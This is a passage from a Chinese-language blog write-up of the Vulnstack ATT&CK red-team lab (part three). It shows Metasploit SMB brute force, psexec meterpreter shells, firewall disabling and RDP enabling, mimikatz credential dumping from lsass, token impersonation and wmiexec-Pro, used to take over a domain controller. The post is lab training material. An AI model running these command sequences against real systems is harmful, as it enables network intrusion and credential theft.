class=\"hljs-number\">7</span> Professional <span class=\"hljs-number\">7601</span> Service Pack <span class=\"hljs-number\">1</span>)\n[*] OsInfo <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\t(Windows Server <span class=\"hljs-number\">2012</span> R2 Datacenter <span class=\"hljs-number\">9600</span>)\n[*] OsInfo <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\t(Windows Server (R) <span class=\"hljs-number\">2008</span> Datacenter <span class=\"hljs-number\">6003</span> Service Pack <span class=\"hljs-number\">2</span>)\n[*] NetBios <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>   win2008.test.org                    Windows Server (R) <span class=\"hljs-number\">2008</span> Datacenter <span class=\"hljs-number\">6003</span> Service Pack <span class=\"hljs-number\">2</span>\n[*] NetBios <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server <span class=\"hljs-number\">2012</span> R2 Datacenter <span class=\"hljs-number\">9600</span>\n[+] mysql <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">3306</span>:root <span class=\"hljs-number\">123</span>\n[+] mysql <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.120</span>:<span class=\"hljs-number\">3306</span>:root <span class=\"hljs-number\">123</span>\n</code></pre>\n<p>一台<code>WIN7</code>，一台<code>server2008</code> ，以及<code>server2012</code>并且都打开了<code>445</code>端口</p>\n</li>\n</ul>\n</li>\n<li>\n<p>总结当前信息</p>\n<p>当前拿下了<code>Centos</code>主机<code>root</code>权限，以及发现 域内主机<code>win2008</code>和<code>win7</code> 以及域控<code>WIN-8GA56TNV3MV</code> ，并且都开放了<code>445</code>端口</p>\n</li>\n</ol>\n<h2>SMB 口令爆破</h2>\n<ol>\n<li>\n<p>使用MSF的<code>smb_login</code>模块进行爆破，尝试爆破<code>win2008</code>的</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/smb/smb_version) > use uxiliary/scanner/smb/smb_login\nmsf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> threads <span class=\"hljs-number\">5</span>\nmsf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> SMBuser administrator\nmsf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\nmsf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> pass_file /root/Desktop/<span class=\"hljs-type\">Dict</span>/Blasting_dictionary-master/top10W.txt\nmsf6 auxiliary(scanner/smb/smb_login) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Starting SMB login bruteforce\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Success: <span class=\"hljs-string\">'.\\administrator:123qwe!ASD'</span> Administrator\n[!] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - No active DB -- Credential data will <span class=\"hljs-keyword\">not</span> be saved!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - Bruteforce completed, <span class=\"hljs-number\">1</span> credential was successful.\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span>     - You can <span class=\"hljs-built_in\">open</span> an SMB session <span class=\"hljs-keyword\">with</span> these credentials <span class=\"hljs-keyword\">and</span> CreateSession <span class=\"hljs-built_in\">set</span> to true\n</code></pre>\n<p>没想到成功了，的到密码<code>123qwe!ASD</code> （这个密码是我自己加上去的，因为我的字典爆破不出来，网上的writeup很多师傅都可以爆破，我就加上了）</p>\n</li>\n<li>\n<p>再使用该密码测试域内其他机器</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(scanner/smb/smb_login) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>\nmsf6 auxiliary(scanner/smb/smb_login) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span> - Starting SMB login bruteforce\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span> - Success: <span class=\"hljs-string\">'.\\administrator:123qwe!ASD'</span> Administrator\n[!] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - No active DB -- Credential data will <span class=\"hljs-keyword\">not</span> be saved!\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> hosts (<span class=\"hljs-number\">100</span>% complete)\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - Bruteforce completed, <span class=\"hljs-number\">1</span> credential was successful.\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.30</span>:<span class=\"hljs-number\">445</span>     - You can <span class=\"hljs-built_in\">open</span> an SMB session <span class=\"hljs-keyword\">with</span> these credentials <span class=\"hljs-keyword\">and</span> CreateSession <span class=\"hljs-built_in\">set</span> to true\n[*] Auxiliary module execution completed\n</code></pre>\n<p>最后发现<code>win2008</code>和<code>win7</code>都是同一密码</p>\n</li>\n</ol>\n<h2>使用psexec连接 &#x26; 抓取密码</h2>\n<ol>\n<li>\n<p>使用MSF里边的模块 连接<code>192.168.93.20</code></p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                         \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>                                 \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBpass 123qwe!ASD                                   \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> payload windows/meterpreter/bind_tcp                 \nmsf6 exploit(windows/smb/psexec) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Connecting to the server...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Authenticating to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-keyword\">as</span> user <span class=\"hljs-string\">'administrator'</span>...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Selecting PowerShell target\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Executing the payload...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">445</span> - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">4444</span>\n[*] Sending stage (<span class=\"hljs-number\">176198</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>\n[*] Meterpreter session <span class=\"hljs-number\">3</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">42597</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">4444</span> via session <span class=\"hljs-number\">2</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">45</span> +0800                                                                                                                          \n</code></pre>\n</li>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n</li>\n<li>\n<p>关闭防火墙以及开启远程桌面</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 关闭防火墙</span>\nC:\\Windows\\system32>netsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\nnetsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\n<span class=\"hljs-comment\"># 注册表开启3389端口</span>\nC:\\Windows\\system32>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\nThe operation completed successfully.\n</code></pre>\n</li>\n<li>\n<p>测试连接远程桌面（记得<code>!</code>前要加斜杠来转义）</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image47.png\" alt=\"image.png\"></p>\n<p>连接成功</p>\n</li>\n<li>\n<p><code>MSF</code>加载<code>mimikatz</code>来抓取密码</p>\n<pre><code class=\"hljs language-python\">C:\\Windows\\system32>exit\nexit\nmeterpreter > load kiwi\nLoading extension kiwi...\n  .<span class=\"hljs-comment\">#####.   mimikatz 2.2.0 20191125 (x86/windows)</span>\n .<span class=\"hljs-comment\">## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)</span>\n <span class=\"hljs-comment\">## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>\n <span class=\"hljs-comment\">## \\ / ##       > http://blog.gentilkiwi.com/mimikatz</span>\n <span class=\"hljs-string\">'## v ##'</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  <span class=\"hljs-string\">'#####'</span>         > http://pingcastle.com / http://mysmartlogon.com  ***/\n\n[!] Loaded x86 Kiwi on an x64 architecture.\n\nSuccess.\n</code></pre>\n<ul>\n<li>\n<p><code>mimikatz</code> 需要在<code>x64</code>下运行，我们ps打印正在运行程序</p>\n<pre><code class=\"hljs language-python\">meterpreter > ps\n            \nProcess <span class=\"hljs-type\">List</span>\n============  \n\n PID   PPID  Name                          Arch  Session  User                          Path \n ---   ----  ----                          ----  -------  ----                          ----   \n <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>     [System Process]   \n <span class=\"hljs-number\">4</span>     <span class=\"hljs-number\">0</span>     System                        x64   <span class=\"hljs-number\">0</span> \n <span class=\"hljs-number\">300</span>   <span class=\"hljs-number\">616</span>   svchost.exe                   x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n <span class=\"hljs-number\">320</span>   <span class=\"hljs-number\">616</span>   SLsvc.exe                     x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\SLsvc.exe\n <span class=\"hljs-number\">408</span>   <span class=\"hljs-number\">4</span>     smss.exe                      x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\smss.exe\n <span class=\"hljs-number\">628</span>   <span class=\"hljs-number\">536</span>   lsass.exe                     x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\lsass.exe \n</code></pre>\n<p>迁移到<code>lsass.exe</code></p>\n<pre><code class=\"hljs language-python\">meterpreter > migrate <span class=\"hljs-number\">628</span>\n[*] Migrating <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">2720</span> to <span class=\"hljs-number\">628.</span>..\n[*] Migration completed successfully.\n</code></pre>\n</li>\n<li>\n<p>抓取密码</p>\n<pre><code class=\"hljs language-python\">meterpreter > creds_all                        \nkerberos credentials                          \n====================                                                                                                                                                                    \n                                              \nUsername       Domain    Password    \n--------       ------    --------             \n(null)         (null)    (null)\nAdministrator  TEST.ORG  zxcASDqw123!!                                                      \nAdministrator  WIN2008   123qwe!ASD\n</code></pre>\n<p>抓取到域的管理员账户密码，密码为 <code>zxcASDqw123!!</code></p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>获取域控shell</h2>\n<ol>\n<li>\n<p>上边抓到了域管理员的密码，我们使用<code>psexec</code>连接</p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                                                     \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBPass zxcASDqw123!!\nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">4445</span>\nmsf6 exploit(windows/smb/psexec) > run\n\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Connecting to the server...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Authenticating to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-keyword\">as</span> user <span class=\"hljs-string\">'administrator'</span>...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Selecting PowerShell target\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Executing the payload...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">4445</span>\n[*] Exploit completed, but no session was created.\nmsf6 exploit(windows/smb/psexec) > \n</code></pre>\n<p>没连上，挠头</p>\n</li>\n<li>\n<p>换别的工具，新找到的一个工具，发现挺好用的</p>\n<blockquote>\n<p><a href=\"https://github.com/XiaoliChan/wmiexec-Pro\">https://github.com/XiaoliChan/wmiexec-Pro</a></p>\n</blockquote>\n<ul>\n<li>\n<p>测试是否成功（密码的<code>!</code>号前面记得加上斜杠转义）</p>\n<pre><code class=\"hljs language-python\">proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span> <span class=\"hljs-built_in\">exec</span>-command -command <span class=\"hljs-string\">\"ipconfig\"</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">[+] Getting command results...\n\nWindows IP Configuration\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::1fa:2f8:97ac:<span class=\"hljs-number\">1160</span>%<span class=\"hljs-number\">12</span>\n   IPv4 Address. . . . . . . . . . . : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\n   Subnet Mask . . . . . . . . . . . : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>\n   Default Gateway . . . . . . . . . : \n\nTunnel adapter isatap.{22AC77BB-<span class=\"hljs-number\">4205</span>-<span class=\"hljs-number\">4120</span>-89CB-C8F5240403E0}:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n</code></pre>\n<p>成功获取到域控IP</p>\n</li>\n<li>\n<p>我们将其防火墙关闭</p>\n<pre><code class=\"hljs language-python\">proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span> firewall -firewall-profile disable\n[+] All firewall profile has been disable.\n</code></pre>\n</li>\n<li>\n<p>开启3389端口（RDP）服务</p>\n<pre><code class=\"hljs language-python\">proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span> rdp -enable\n[+] Enabling RDP services <span class=\"hljs-keyword\">and</span> setting up firewall.\n[+] RDP port: <span class=\"hljs-number\">3389</span>\n[+] RDP enabled!\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>窃取管理员<code>token</code>令牌</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># meterpreter > use incognito</span>\n\n<span class=\"hljs-comment\"># meterpreter > list_tokens -u  </span>\nDelegation Tokens Available\n========================================\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nTEST\\administrator\nWIN2008\\Administrator\n\n<span class=\"hljs-comment\"># meterpreter > impersonate_token \"TEST\\administrator\"</span>\n[+] Delegation token available\n[+] Successfully impersonated user TEST\\administrator\n</code></pre>\n</li>\n<li>\n<p>尝试连接远程桌面</p>\n<pre><code class=\"hljs language-python\">proxychains rdesktop <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span> -p zxcASDqw123\\!\\! -u administrator -v     \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class=\"hljs-number\">.4</span>\n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>\nis_wm_active(): WM name: Xfwm\nConnecting to server using NLA...\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">3389</span>  ...  OK\nCore(warning): Certificate received <span class=\"hljs-keyword\">from</span> server <span class=\"hljs-keyword\">is</span> NOT trusted by this system, an exception has been added by the user to trust this specific certificate.\nTLS  Session info: (TLS1<span class=\"hljs-number\">.2</span>)-(DHE-CUSTOM1024)-(RSA-SHA1)-(AES-<span class=\"hljs-number\">256</span>-GCM)\n\nFailed to initialize NLA, do you have correct Kerberos TGT initialized ?\nFailed to connect using NLA, trying <span class=\"hljs-keyword\">with</span> SSL\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">3389</span>  ...  OK\nFailed to connect, CredSSP required by server (check <span class=\"hljs-keyword\">if</span> server has disabled old TLS versions, <span class=\"hljs-keyword\">if</span> yes use -V option).\n</code></pre>\n<p>失败</p>\n</li>\n<li>\n<p>再尝试<code>Psexec</code></p>\n<pre><code class=\"hljs language-python\">msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                                                     \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> SMBPass zxcASDqw123!!\nmsf6 exploit(windows/smb/psexec) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">4445</span>\nmsf6 exploit(windows/smb/psexec) > run\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Connecting to the server...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Authenticating to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> <span class=\"hljs-keyword\">as</span> user <span class=\"hljs-string\">'administrator'</span>...\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Selecting PowerShell target\n[*] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Executing the payload...\n[+] <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">4445</span>\n[*] Sending stage (<span class=\"hljs-number\">176198</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>\n[*] Meterpreter session <span class=\"hljs-number\">4</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.100</span>:<span class=\"hljs-number\">51849</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.93</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">4445</span> via session <span class=\"hljs-number\">2</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">58</span>:06 +0800\nmeterpreter > \n</code></pre>\n<p>成功了，拿到了域控的<code>shell</code> ！！</p>\n</li>\n<li>\n<p>最后发现可以先远程到win2008然后再远程到域控</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image48.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>读取Flag文件</h2>\n<pre><code class=\"hljs language-python\">C:\\Users\\Administrator\\Documents><span class=\"hljs-built_in\">dir</span>\n Volume <span class=\"hljs-keyword\">in</span> drive C has no label.\n Volume Serial Number <span class=\"hljs-keyword\">is</span> D6DC-065A\n\n Directory of C:\\Users\\Administrator\\Documents\n\n<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">31</span>/<span class=\"hljs-number\">2019</span>  <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span> AM    &#x3C;DIR>          .\n<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">31</span>/<span class=\"hljs-number\">2019</span>  <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span> AM    &#x3C;DIR>          ..\n<span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">31</span>/<span class=\"hljs-number\">2019</span>  <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">53</span> AM                <span class=\"hljs-number\">13</span> flag.txt\n               <span class=\"hljs-number\">1</span> File(s)             <span class=\"hljs-number\">13</span> <span class=\"hljs-built_in\">bytes</span>\n               <span class=\"hljs-number\">2</span> Dir(s)  <span class=\"hljs-number\">50</span>,<span class=\"hljs-number\">368</span>,<span class=\"hljs-number\">212</span>,<span class=\"hljs-number\">992</span> <span class=\"hljs-built_in\">bytes</span> free\n\nC:\\Users\\Administrator\\Documents><span class=\"hljs-built_in\">type</span> flag.txt\n<span class=\"hljs-built_in\">type</span> flag.txt\nthis <span class=\"hljs-keyword\">is</span> flag!\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image49.png\" alt=\"image.png\"></p>\n<h2>总结</h2>\n<p>ew代理使用，更熟悉MSF框架，以及域内有linux和windows两种系统渗透，其实除了爆破还有NTLM中继的思路，但是还没有实现，接着就去实现NTLM中继</p>","title":"Vulnstack - ATT&CK红队评估实战靶场(三)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机","description":"ATT&CK红队评估实战靶场(三)\n\n http://vulnstack.qiyuanxuetang.net/vuln/detail/5/\n \n\n靶场搭建\n\n1. 修改仅主机网卡 A IP为`192.168.93.0` ，然后在添加一张仅主机网卡B，ip随意，我这里为`192.168.213.0` 网段\n2. web主机网卡内网设置网卡 A，出口网卡为网卡B\n3. 其余主机网卡都是仅主机网卡 A\n..."},"recentPosts":[{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"}]},"__N_SSG":true}